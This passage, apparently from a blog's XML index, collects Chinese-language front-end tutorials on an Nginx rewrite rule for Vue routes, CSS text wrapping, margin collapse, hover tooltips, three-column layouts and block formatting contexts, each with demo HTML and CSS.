1234567891011 # 路由配置页面无缓存location ~ ^/app/module/ &#123; root /xxx/dist; index index.html index.htm; expires -1; add_header Cache-Control no-cache; try_files $uri $uri/ @rewrites;&#125;location @rewrites &#123; rewrite ^/(app)\/module\/(index|about)/ /$1_static/module/$2.html break;&#125; rewrites也可以使用最原始的方式，但是我认为这是最简洁的方式，因为需要支持module后面多个路径（定义为二级页面）。 123456 location @rewrites &#123; rewrite ^/app/module/index /app_static/module/index.html break; rewrite ^/app/module/about /app_static/module/about.html break; # 二级页面配置 rewrite ^/app/module/sale/sale_info /app_static/module/sale/sale_info.html break;&#125; 访问地址 http://localhost/app/module/indexhttp://localhost/app/module/abouthttp://localhost/app/module/sale/sale_info 参考 https://www.cnblogs.com/bigberg/p/7644192.htmlhttps://blog.csdn.net/fay462298322/article/details/54666636/ https://segmentfault.com/a/1190000002797606]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>history模式</tag>
        <tag>资源缓存</tag>
        <tag>revving</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防止文字环绕]]></title>
    <url>%2Fblob%2F2019-01-17-prevent-text-wrapping%2F</url>
    <content type="text"><![CDATA[什么是文字环绕 浮动的盒子会遮盖下面的盒子，但是下面盒子里的文字是不会被遮盖的，文字反而还会环绕浮动的盒子。 12345678910111213141516171819202122232425262728 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; .word-wrap&#123; column-span: all; &#125; .word-left&#123; width: 100px; height: 100px; float: left; background: #cad9f2; &#125; .word-el&#123;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="word-wrap"&gt; &lt;div class="word-left"&gt;&lt;/div&gt; &lt;div class="word-el"&gt; This is some text.This is some text. This is some text.This is some text. This is some text.This is some text. This is some text.This is some text. This is some text.This is some text. This is some text.This is some text. This is some text.This is some text. &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 效果图 这里是float: left，使用float: right会在右侧文字环绕；如果浮动的盒子在文字后面，不会形成环绕 防止文字环绕（BFC） 一般给出的方法都是在文字所在的盒子添加overflow: hidden产生BFC达到文字不环绕。 要使用其他方法参考理解BFC 其中也有不能使用，或者不适合的方式： display中的inline-block、inline-flex、inline-grid、inline-table 当文字内容过多所占用宽度超过浮动盒子margin box的右边到父级border box的右边（对于从左往右的格式化，否则相反）文字内容会换行；可以手动指定内容宽度，这样就失去了意义。 display中的flow-root也可以实现，但是兼容性不好。 position中的absolute需要在外部设置position: relative同时还要设置位置；fixed就不要使用了。 如果要使用float需要使用宽度，同样也失去了意义。 column-span也不能解决问题。 contain：layout、content、strict也可以实现，但是兼容性不好。 所以BFC方式如下属性和值暂未发现不妥的地方： display：table、table-cell、table-caption、table-row、table-row-group、table-header-group、table-footer-group overflow：hidden、scroll、auto、overlay columns、column-count、column-width：兼容性一般 可能有些值会有副作用，发现之后再进行补充 防止文字环绕（非BFC） 给文字所在盒子添加margin-left或者margin-right等于浮动盒子margin box左边到右边的距离 上面代码添加如下代码即可 1 .word-el&#123;margin-left: 100px;&#125; 参考]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>文字环绕</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防止垂直margin重叠]]></title>
    <url>%2Fblob%2F2019-01-17-preventing-vertical-margin-overlap%2F</url>
    <content type="text"><![CDATA[垂直margin重叠 什么是垂直margin重叠 如下图，父元素没有设置margin-top，而子元素设置了margin-top：20px;可以看出，父元素也一起有了边距。 上图的代码 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .demo&#123; height:100px; background: #eee; &#125; .parent&#123; height:200px; background: #88f; &#125; .child&#123; height:100px; margin-top:20px; background: #0ff; width:200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class="demo"&gt; &lt;h2&gt;此部分是能更容易看出让下面的块的margin-top。&lt;/h2&gt; &lt;/section&gt; &lt;section class = "parent"&gt; &lt;article class="child"&gt; &lt;h2&gt;子元素&lt;/h2&gt; margin-top:20px; &lt;/article&gt; &lt;h2&gt;父元素&lt;/h2&gt; 没有设置margin-top &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 垂直margin重叠解决方案(BFC) 首先要明确BFC是什么意思，其全英文拼写为 Block Formatting Context 直译为“块级格式化上下文” 参考理解BFC 看一个垂直margin重叠例子 1234567891011121314151617181920212223242526272829303132333435 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .top&#123; background: #0ff; height:100px; margin-bottom:30px; &#125; .bottom&#123; height:100px; margin-top:50px; background: #ddd; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class="top"&gt; &lt;h1&gt;上&lt;/h1&gt; margin-bottom:30px; &lt;/section&gt; &lt;section class="bottom"&gt; &lt;h1&gt;下&lt;/h1&gt; margin-top:50px; &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 效果图 用bfc可以解决垂直margin重叠的问题 关键代码 123456789101112 &lt;section class="top"&gt; &lt;h1&gt;上&lt;/h1&gt; margin-bottom:30px;&lt;/section&gt;&lt;!-- 给下面这个块添加一个父元素，在父元素上创建bfc --&gt;&lt;div style="overflow:hidden"&gt; &lt;section class="bottom"&gt; &lt;h1&gt;下&lt;/h1&gt; margin-top:50px; &lt;/section&gt;&lt;/div&gt; 效果图 这里只应用了产生BFC的overflow: hidden，可以尝试理解BFC中提到的更多方式 如果重叠发生在父子元素上，可在父元素上使用此方法 垂直margin重叠解决方案(非BFC) 给父元素加边框border （副作用） 给父元素设置padding值 （副作用） 父元素加前置内容生成。 12345678910111213141516 .parent &#123; width : 500px; height : 500px; background-color : red; &#125;.parent::before, .parent::after &#123; content : " "; display : table;&#125;.child &#123; width : 200px; height : 200px; background-color : green; margin-top : 50px;&#125; 123 &lt;div class="parent"&gt; &lt;div class="child"&gt;&lt;/div&gt; &lt;/div&gt;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>margin重叠</tag>
        <tag>边距重叠</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css实现了hover显示title的效果]]></title>
    <url>%2Fblob%2F2019-01-14-css-realizes-the-effect-of-hover-displaying-title%2F</url>
    <content type="text"><![CDATA[代码 1234567891011121314151617 &lt;div data-title="hello, world"&gt;hello...&lt;/div&gt;&lt;style&gt;div &#123; position: relative;&#125;div:hover::after &#123; content: attr(data-title); //取到data-title属性的值 display: inline-block; padding: 10px 14px; border: 1px solid #ddd; border-radius: 5px; position: absolute; top: -50px; left: -30px;&#125;&lt;/style&gt; 效果图 参考 https://www.cnblogs.com/horanly/p/6101283.html]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>title</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三栏布局的解决方案]]></title>
    <url>%2Fblob%2F2019-01-09-solution-of-three-column-layout%2F</url>
    <content type="text"><![CDATA[假设高度已知，请写出三栏布局，左栏、右栏宽度300px，中间宽度自适应。 这道题本身的难度并不大，我们在布局页面的时候，写个三栏布局还是挺简单的。但是如果在面试的时候遇到这道题，就没有那么简单了。看似简单的一道题，想把它答好是不简单的。往往越简单的题越不好答。如果看到这题只想到了浮动和绝对定位，那这题你连及格都及格不了。 几种三栏布局的方法。 在写布局代码之前，先写两段公共的样式，此段写在头部。 样式 123456789 &lt;style media="screen"&gt; html *&#123; padding: 0; margin: 0; &#125; .layout article div&#123; min-height: 100px; &#125;&lt;/style&gt; 浮动布局(BFC) 1234567891011121314151617181920212223242526272829 &lt;!--浮动布局 --&gt;&lt;section class="layout float"&gt; &lt;style media="screen"&gt; .layout.float .left&#123; float:left; width:300px; background: red; &#125; .layout.float .center&#123; background: yellow; overflow: hidden; &#125; .layout.float .right&#123; float:right; width:300px; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-right-center"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;h2&gt;浮动解决方案&lt;/h2&gt; 1.这是三栏布局的浮动BFC解决方案； 2.这是三栏布局的浮动BFC解决方案； &lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 浮动布局是有局限性的，浮动元素是脱离文档流，要做清除浮动，这个处理不好的话，会带来很多问题，比如高度塌陷等。 浮动布局的优点就是比较简单，兼容性也比较好。只要清除浮动做的好，是没有什么问题的。 延伸：你知道哪些清除浮动的方案？每种方案的有什么优缺点? 浮动布局(非BFC) 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;section class="layout float"&gt; &lt;style media="screen"&gt; .left-right-center&#123; overflow: auto; &#125; .layout.float .left&#123; float:left; width:300px; background: red; min-height: 100px; &#125; .layout.float .center&#123; background: yellow; min-height: 50px; &#125; .layout.float .center-inner&#123; margin-left: 300px; margin-right: 300px; min-height: 50px; &#125; .layout.float .right&#123; float:right; width:300px; background: blue; min-height: 100px; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-right-center"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;div class="center-inner"&gt; &lt;h2&gt;浮动解决方案&lt;/h2&gt; 1.这是三栏布局的浮动非BFC解决方案； 2.这是三栏布局的浮动非BFC解决方案； &lt;/div&gt; &lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 通过在div.center中添加一个div.center-inner并且左右margin值为浮动元素的宽度 绝对定位布局 123456789101112131415161718192021222324252627282930313233 &lt;!-- 绝对布局 --&gt;&lt;section class="layout absolute"&gt; &lt;style&gt; .layout.absolute .left-center-right&gt;div&#123; position: absolute; &#125; .layout.absolute .left&#123; left:0; width: 300px; background: red; &#125; .layout.absolute .center&#123; left: 300px; right: 300px; background: yellow; &#125; .layout.absolute .right&#123; right:0; width: 300px; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-center-right"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;h2&gt;绝对定位解决方案&lt;/h2&gt; 1.这是三栏布局的绝对定位解决方案； 2.这是三栏布局的绝对定位解决方案; &lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 绝对定位布局优点，很快捷，设置很方便，而且也不容易出问题，你可以很快的就能想出这种布局方式。 缺点就是，绝对定位是脱离文档流的，意味着下面的所有子元素也会脱离文档流，这就导致了这种方法的有效性和可使用性是比较差的。 flex布局 123456789101112131415161718192021222324252627282930313233 &lt;!-- flexbox布局 --&gt;&lt;section class="layout flexbox"&gt; &lt;style&gt; .layout.flexbox&#123; margin-top: 110px; &#125; .layout.flexbox .left-center-right&#123; display: flex; &#125; .layout.flexbox .left&#123; width: 300px; background: red; &#125; .layout.flexbox .center&#123; flex:1; background: yellow; &#125; .layout.flexbox .right&#123; width: 300px; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-center-right"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;h2&gt;flexbox解决方案&lt;/h2&gt; 1.这是三栏布局的felx解决方案； 2.这是三栏布局的flex解决方案； &lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/article&gt;&lt;/section&gt; felxbox布局是css3里新出的一个，它就是为了解决上述两种方式的不足出现的，是比较完美的一个。目前移动端的布局也都是用flexbox。 felxbox的缺点就是不能兼容IE8及以下浏览器。 表格布局 12345678910111213141516171819202122232425262728293031323334 &lt;!-- 表格布局 --&gt;&lt;section class="layout table"&gt; &lt;style&gt; .layout.table .left-center-right&#123; width:100%; height: 100px; display: table; &#125; .layout.table .left-center-right&gt;div&#123; display: table-cell; &#125; .layout.table .left&#123; width: 300px; background: red; &#125; .layout.table .center&#123; background: yellow; &#125; .layout.table .right&#123; width: 300px; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-center-right"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;h2&gt;表格布局解决方案&lt;/h2&gt; 1.这是三栏布局的表格解决方案； 2.这是三栏布局的表格解决方案; &lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 表格布局在历史上遭到很多人的摒弃，说表格布局麻烦，操作比较繁琐，其实这是一种误解，在很多场景中，表格布局还是很适用的，比如这个三栏布局，用表格布局就轻易写出来了。还有表格布局的兼容性很好，在flex布局不兼容的时候，可以尝试表格布局。 表格布局也是有缺陷的，当其中一个单元格高度超出的时候，两侧的单元格也是会跟着一起变高的，而有时候这种效果不是我们想要的。 网格布局 1234567891011121314151617181920212223242526272829303132333435 &lt;!-- 网格布局 --&gt;&lt;section class="layout grid"&gt; &lt;style&gt; .layout.grid .left-center-right&#123; width:100%; display: grid; grid-template-rows: 100px; grid-template-columns: 300px auto 300px; &#125; .layout.grid .left-center-right&gt;div&#123; &#125; .layout.grid .left&#123; width: 300px; background: red; &#125; .layout.grid .center&#123; background: yellow; &#125; .layout.grid .right&#123; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-center-right"&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center"&gt; &lt;h2&gt;网格布局解决方案&lt;/h2&gt; 1.这是三栏布局的网格布局解决方案； 2.这是三栏布局的网格布局解决方案; &lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 网格布局也是新出的一种布局方式，如果你答出这种方式，也就证明了你的实力，证明你对技术热点是有追求的，也说明你有很强的学习能力。 cale()计算宽度 1234567891011121314151617181920212223242526272829 &lt;section class="layout cale"&gt; &lt;style media="screen"&gt; .layout article div&#123; display: inline-block; min-height: 100px; vertical-align: top; &#125; .layout.cale .left&#123; width:300px; background: red; &#125; .layout.cale .center&#123; background: yellow; width: calc(100% - 600px); &#125; .layout.cale .right&#123; width:300px; background: blue; &#125; &lt;/style&gt; &lt;h1&gt;三栏布局&lt;/h1&gt; &lt;article class="left-right-center"&gt; &lt;div class="left"&gt;&lt;/div&gt;&lt;div class="center"&gt; &lt;h2&gt;cale解决方案&lt;/h2&gt; 1.这是三栏布局的cale解决方案； 2.这是三栏布局的cale解决方案； &lt;/div&gt;&lt;div class="right"&gt;&lt;/div&gt; &lt;/article&gt;&lt;/section&gt; 这里面有两个问题解决，一个是inline-block元素之间的空隙的消除，一个是inline-block元素上浮无法对齐。 calc的兼容性 效果图 这几种解决方案应该是最常见的三栏布局，如果你还有其他的方案，欢迎补充！ 延伸 最后这个问题还有很多延伸问题的，比如， 高度已知换为高度未知呢？块内内容超出会是怎样的效果？如果是上下高度已知，中间自适应呢？如果是两栏布局呢？如果是上下左右混合布局呢？以上几个延伸你能否轻松应对，如果绝对还有欠缺，尽早查缺补漏吧！ 欢迎补充！ 参考 https://www.cnblogs.com/chengzp/p/layout.htmlhttps://www.css88.com/book/css/values/functional/calc().htm]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>三栏布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解BFC]]></title>
    <url>%2Fblob%2F2019-01-08-understanding-bfc%2F</url>
    <content type="text"><![CDATA[定义 块格式化上下文（Block Formatting Context，BFC） 是Web页面的可视化CSS渲染的一部分，是布局过程中生成块级盒子的区域，也是浮动元素与其他元素的交互限定区域。 A block formatting context is a part of a visual CSS rendering of a Web page. It is the region in which the layout of block boxes occurs and in which floats interact with other elements. BFC的原理 内部的box会在垂直方向，一个接一个的放置。 每个元素的margin box的左边，与包含块border box的左边相接触（对于从左往右的格式化，否则相反）。即使存在浮动也是如此。 box垂直方向的距离由margin决定，属于同一个bfc的两个相邻box的margin会发生重叠。 bfc的区域不会与浮动区域的box重叠。 bfc是一个页面上的独立的容器，外面的元素不会影响bfc里的元素，反过来，里面的也不会影响外面的。 计算bfc高度的时候，浮动元素也会参与计算。 BFC的功能 你可以将BFC看作是页面中的一个迷你布局。一旦元素创建了一个BFC，它其中的所有元素都会被它包裹。正如我们所见的，当盒子变成BFC之后，它内部的浮动元素就再也不可能突破它的底部（也就是说，盒子不再会因内部元素浮动而坍塌）。 创建块格式化上下文方式 根元素或包含根元素的元素 浮动元素（元素的 float 不是 `none） 绝对定位元素（元素的 position 为 absolute 或 fixed） 行内块元素（元素的 display 为 inline-block） 表格单元格（元素的 display为 table-cell，HTML表格单元格默认为该值） 表格标题（元素的 display 为 table-caption，HTML表格标题默认为该值） 匿名表格单元格元素（元素的 display为 table、table-row、 table-row-group、table-header-group、table-footer-group（分别是HTML table、row、tbody、thead、tfoot的默认属性）或 inline-table） overflow 值不为 visible 的块元素 display 值为 flow-root 的元素 contain 值为 layout、content或 strict 的元素 弹性元素（display为 flex 或 inline-flex元素的直接子元素） 网格元素（display为 grid 或 inline-grid 元素的直接子元素） 多列容器（元素的 column-count 或 column-width 不为 auto，包括 column-count 为 1） column-span 为 all 的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中（标准变更，Chrome bug） 实现 html（根元素或包含根元素的元素） 12345678910111213 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .root-bfc&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="root-bfc"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; html根元素不因为内部元素的margin外溢，而body元素会外溢 float!=none（浮动元素） 123456789101112131415161718192021222324252627 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .float-wrap&#123; overflow: hidden; &#125; .float-left&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; float: left; &#125; .float-right&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; float: right; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="float-wrap"&gt; &lt;div class="float-left"&gt;&lt;/div&gt; &lt;div class="float-right"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 添加float之后会产生浮动脱离文档流，这时根据需要在外层清除浮动；如果在body元素清除浮动，overflow以外的方法都可以使用 position=absolute、fixed（绝对定位元素） 123456789101112131415161718192021222324252627282930 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .position-wrap&#123; &#125; .position-absolute&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; position: absolute; top: 10px; left: 10px; &#125; .position-fixed&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; position: fixed; right: 10px; top: 10px; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="position-wrap"&gt; &lt;div class="position-absolute"&gt;&lt;/div&gt; &lt;div class="position-fixed"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 定位之后margin不会消失，但是会脱离文档流 如果不加位置数据，同样可以实现bfc，后续内容要使用margin-top撑开，等其他方法 display=inline-block（行内块级元素） 123456789101112131415161718 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .inline-block-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; display: inline-block; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="inline-block-wrap"&gt; &lt;div class="inline-block-el"&gt;&lt;/div&gt; &lt;div class="inline-block-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; display: inline-block使用后margin不会穿透父元素，同时还需要解决如果两个inline-block在同一行，会有元素之间有空隙、元素上浮无法对齐的问题；也可以作用在父元素上面，子元素margin属性不会穿透父元素，父元素也可能遇到上面两个问题； display=table-cell（表格单元格） 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .table-cell-wrap&#123; display: table-cell; &#125; .table-cell-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="table-cell-wrap"&gt; &lt;div class="table-cell-el"&gt;&lt;/div&gt; &lt;div class="table-cell-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在父元素使用作为一个表格单元格，子元素margin属性不会穿透父元素； display=table-caption（表格标题） 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .table-caption-wrap&#123; display: table-caption; &#125; .table-caption-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="table-caption-wrap"&gt; &lt;div class="table-caption-el"&gt;&lt;/div&gt; &lt;div class="table-caption-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在父元素使用作为一个表格标题显示，子元素margin属性不会穿透父元素； display=some value（匿名表格单元格元素） 元素的 display为 table、table-row、 table-row-group、table-header-group、table-footer-group（分别是HTML table、row、tbody、thead、tfoot的默认属性）或 inline-table table、table-row、 table-row-group、table-header-group、table-footer-group 的用法同table-caption，需要使用在父元素子元素才不会穿透父元素 inline-table 的用法同 inline-block overflow!=visible 1234567891011121314151617181920212223242526272829 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .overflow-wrap--auto&#123; overflow: auto; &#125; .overflow-wrap--hidden&#123; overflow: hidden; &#125; .overflow-wrap--overlay&#123; overflow: overlay; &#125; .overflow-wrap--scroll&#123; overflow: scroll; &#125; .overflow-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="overflow-wrap overflow-wrap--auto"&gt; &lt;div class="overflow-el"&gt;&lt;/div&gt; &lt;div class="overflow-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; overflow属性为auto hidden overlay scroll 时触发bfc，其子元素margin不会穿透 如果父元素为四个值时，当前元素可使用inherit display=flow-root 123456789101112131415161718192021222324 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .flow-root-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125; .clearfix&#123; display: flow-root; &#125; @supports not (display:flow-root) &#123; .clearfix::after&#123;content:" "; display:block; clear:both; visibility:hidden; height:0&#125; .clearfix&#123;zoom:1&#125; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="flow-root-wrap clearfix"&gt; &lt;div class="flow-root-el"&gt;&lt;/div&gt; &lt;div class="flow-root-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; display: flow-root只支持Firefox 53+、Chrome 58+、Opera 45+，通过@supports能支持Edge contain=layout、content、strict 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .contain-wrap&#123; contain: layout; &#125; .contain-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="contain-wrap"&gt; &lt;div class="contain-el"&gt;&lt;/div&gt; &lt;div class="contain-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; contain 属性允许开发者声明当前元素和它的内容尽可能的独立于 DOM 树的其他部分。 其中layout、content、strict 可触发BFC display=flex、inline-flex（弹性元素） 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .flex-wrap&#123; display: flex; &#125; .flex-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="flex-wrap"&gt; &lt;div class="flex-el"&gt;&lt;/div&gt; &lt;div class="flex-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 当为inline-flex时遇到的问题同inline-block display=grid、inline-grid（网格元素） 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .grid-wrap&#123; display: grid; &#125; .grid-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="grid-wrap"&gt; &lt;div class="grid-el"&gt;&lt;/div&gt; &lt;div class="grid-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 当为inline-grid时遇到的问题同inline-block column-count、column-width!=auto（多列容器） 元素的 column-count 或 column-width 不为 auto，包括 column-count 为 1 123456789101112131415161718192021 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .column-wrap&#123; column-width: 200px; column-count: 2; &#125; .column-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="column-wrap"&gt; &lt;div class="column-el"&gt;&lt;/div&gt; &lt;div class="column-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 虽然截图中margin超出body边界，实际情况确是没有。 columns的使用方法见文末参考 column-span=all 1234567891011121314151617181920 &lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;style&gt; *&#123;margin:0; padding:0;&#125; html&#123;background: #f9fae2;&#125; body&#123;background: #cad9f2;&#125; .column-span-wrap&#123; column-span: all; &#125; .column-span-el&#123; width: 100px; height: 100px; margin: 50px; background: #ff8d8d; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="column-span-wrap"&gt; &lt;div class="column-span-el"&gt;&lt;/div&gt; &lt;div class="column-span-el"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 添加之后我行为异常 总结 触发BFC主要有一些几个元素 根元素：HTML float：不为none position：absolute、fixed display：inline-block、table、table-cell、table-caption、table-row、table-row-group、table-header-group、table-footer-group、inline-table、flow-root、flex、inline-flex、grid、inline-grid contain：layout、content、strict overflow：不为visible columns、column-count、column-width、column-span 应用场景 BFC的应用场景主要有一下几个方面，这里不做展开讨论，将单独写文章 自适应三栏布局 清除内部浮动 防止垂直margin重叠 防止文字环绕 参考 https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_contexthttps://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context https://www.w3.org/TR/CSS21/visuren.html#block-formattinghttps://drafts.csswg.org/css-display/#block-formatting-contexthttps://blog.csdn.net/woshinannan741/article/details/51113612 https://developer.mozilla.org/en-US/docs/Web/CSS/displayhttps://www.w3cplus.com/css3/display-flow-root.html https://developer.mozilla.org/zh-CN/docs/Web/CSS/containhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/columnshttps://www.cnblogs.com/xinjie-just/p/5953386.html 